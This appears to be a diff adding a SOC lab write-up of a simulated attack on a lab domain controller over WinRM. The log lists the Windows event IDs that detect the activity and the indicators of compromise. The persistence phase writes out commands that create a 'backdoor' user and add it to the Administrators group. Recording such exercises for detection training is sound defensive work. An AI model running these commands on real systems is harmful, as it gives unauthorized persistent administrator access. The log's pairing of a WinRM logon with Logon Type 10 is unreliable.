@@ -1,0 +1,35 @@
+=== SOC PROJECT: ATTACK SIMULATION ===
+Date: 2026-08-27
+Target: DC01.cyberlab.local (192.168.1.5)
+
+[PHASE 1] Reconnaissance
+- Port Scan: 445 (open), 3389 (closed), 5985 (open)
+- Service Detection: Microsoft HTTPAPI httpd 2.0
+
+[PHASE 2] Initial Access
+- Connection: WinRM (Port 5985)
+- User: Administrator
+
+[PHASE 3] Command Execution
+- whoami → cyberlab\administrator
+- hostname → DC01
+
+[PHASE 4] Persistence
+- net user backdoor [PASSWORD] /add → SUCCESS
+- net localgroup Administrators backdoor /add → SUCCESS
+- Verified: backdoor is member of Administrators
+
+[PHASE 5] Cleanup
+- net user backdoor /delete → SUCCESS
+
+[DETECTION]
+- Event 4720: User account created (backdoor)
+- Event 4732: Member added to Administrators group
+- Event 4624: Successful logon (Logon Type 10 - WinRM)
+- Event 4688: Process creation (net.exe)
+
+[IOCs]
+- Attacker IP: 192.168.1.10
+- Target: 192.168.1.5
+- Account: backdoor
+- Tool: Evil-WinRM, net.exe
